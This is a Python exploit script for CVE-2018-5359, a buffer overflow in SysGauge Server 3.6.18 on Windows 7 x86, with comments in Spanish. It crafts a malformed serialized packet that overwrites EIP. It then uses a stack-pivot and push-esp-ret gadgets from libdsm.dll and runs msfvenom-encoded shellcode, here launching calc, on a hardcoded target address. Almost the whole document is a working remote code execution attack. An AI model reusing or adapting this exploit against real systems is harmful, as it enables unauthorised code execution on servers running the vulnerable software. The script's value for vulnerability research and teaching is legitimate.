# coding: utf8
# CVE-2018-5359: SysGauge Server v3.6.18 Remote Code Execution
# Windows 7 x86
# by hdbreaker

import binascii
import socket
import struct

ip = "192.168.0.23"
port = 9221
con = (ip, port)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(con)

pkg_header =  "\x75\x19\xba\xab"
pkg_header += "\x03\x00\x00\x00"

# Max package size: 0x400 si es mayor se va para afuera
### No se por que estos 3 valores deben ser iguales sino nunca llega a donde rompe ###
pkg_size_dup3 = struct.pack("<I", 0x400) 
pkg_size = struct.pack("<I", 0x400)
pkg_size_dup = struct.pack("<I", 0x400) 
pkg_size_chain = pkg_size_dup3 + pkg_size + pkg_size_dup
### No se por que estos 3 valores deben ser iguales sino nunca llega a donde rompe ###

# Debe ser 0x00000031 para indicar que el mensaje esta serializado
pkg_serialized_flag = struct.pack("<I", 0x00000031) # FLAG MENSAJE SERIALIZADO

# EL BUG QUE SOBRE ESCRIBE EIP SE ENCUENTRA CUANDO ES LLAMADA LA FUNCION: "libpal_?Deserialize@SCA_NetMessage"
# MAS REVERSING HERE [WIP]
padding = "A"* 128 # Padding para pisar EIP
eip =  struct.pack("<L", 0x1001C6DE) # libdsm.dll: add esp, 658, STACK PIVOT para llegar al payload

junk = "A"*8 # Junk para posicionar el gadget push esp, ret
# El Stack Pivot caera sobre un pequeÃ±o rop: push esp, ret que pasara la ejecucion al stack y ejecutara el shellcode
push_esp_ret = struct.pack("<L", 0x10066657) # libdsm.dll: push esp, ret # Change execution to STACK - No Badchars allowed

nopsleed  = "\x90" * 88
# 324 bytes: exec: calc | no badchars
# ./msfvenom -a x86 --platform windows -p windows/exec cmd=calc -e x86/shikata_ga_nai -i 5 -b '\x00\xFF\x0A\x0D' -f python
shellcode =  ""
shellcode += "\xb8\xc1\x53\x7b\xd6\xdb\xd9\xd9\x74\x24\xf4\x5b\x33"
shellcode += "\xc9\xb1\x4b\x83\xeb\xfc\x31\x43\x0f\x03\x43\xce\xb1"
shellcode += "\x8e\x6d\x68\xf2\x9c\xb6\x51\x3d\x87\xc3\x45\x4a\x60"
shellcode += "\x1d\x4c\x03\xd5\xde\x8e\x60\xe7\xb8\x1e\x6a\x5f\x29"
shellcode += "\x44\x5e\x0f\xb7\x36\xd6\x54\x61\x4d\x8c\x22\x92\xf6"
shellcode += "\x84\x6b\x5f\x0e\xfd\x27\x31\x03\x22\x9c\x75\x55\xec"
shellcode += "\x14\x2f\xd6\x92\xfb\xc2\xc5\x4b\xd3\xc8\xb1\x9d\x73"
shellcode += "\x71\x62\x76\xf4\x33\xdd\x37\x80\xda\x87\x83\x54\xe7"
shellcode += "\xdf\xef\x22\x60\x3e\x55\xc4\x9d\x65\x8b\x05\x44\x47"
shellcode += "\xc6\x06\x60\x74\xb1\x3f\x14\xb7\xf2\xa6\x1f\x31\x1a"
shellcode += "\x80\x87\x21\x2a\x25\xb3\x5e\xf1\x14\x0c\x33\xec\x9e"
shellcode += "\xd3\xe6\xd9\xd6\x2e\xfe\xe4\xd2\x24\x7b\x49\x11\xa9"
shellcode += "\x17\x95\x9e\xe9\x6d\x0f\x65\xe4\xa6\xc3\x43\x6b\x01"
shellcode += "\xc1\x1e\xa5\x76\x66\xad\x70\x93\x9f\x7d\x6d\x45\x6e"
shellcode += "\xf5\x57\x25\x17\xe0\x31\x9c\x07\x10\xeb\xf7\xb3\x20"
shellcode += "\x5a\x68\x9e\x7e\x73\x8f\xf8\x08\x76\x23\xc9\x26\x96"
shellcode += "\x48\xcb\x9b\x31\xc8\x29\xb7\xc7\x7a\xec\x78\x52\x28"
shellcode += "\x35\x55\xc6\x34\x03\x0e\x2c\x7b\xce\xc6\x96\x65\x97"
shellcode += "\xaa\x7f\x6e\x9f\xbc\x9e\xf6\x2f\x68\xac\x55\x89\xc8"
shellcode += "\xf1\xfb\x14\xc2\x50\xdd\x25\xe2\xb1\x4a\xc4\x76\x20"
shellcode += "\x5d\x12\x75\x1b\xd6\x85\x92\x91\xda\x58\x5d\x14\x65"
shellcode += "\x71\x50\x82\x82\x9e\x02\xfa\xf5\xa7\xce\x3c\xf4\xa6"
shellcode += "\xfd\xe7\xc4\x46\x76\xd6\x83\xf4\xba\xe7\x57\x23\x19"
shellcode += "\xce\x56\x04\xca\x85\xda\xf9\xa8\x9e\xb8\xbe\xb7\x1d"
shellcode += "\x88\xe0\x33\x61\x5a\x74\xa4\x6c\x55\x12\x01\x93"

# Junk para completar el package size
junk2 = "C" * (788 - len(shellcode))

# Crafting Payload
payload = junk + push_esp_ret + nopsleed + shellcode + junk2

# Package Tail: Si se modifica el paquete no es procesado
pkg_end =  "30010000000000ffff"

# Crafting malicious package
package = pkg_header + pkg_size_chain + pkg_serialized_flag + padding + eip + payload + pkg_end

s.send(package)
print s.recv(1024)
print s.recv(1024)

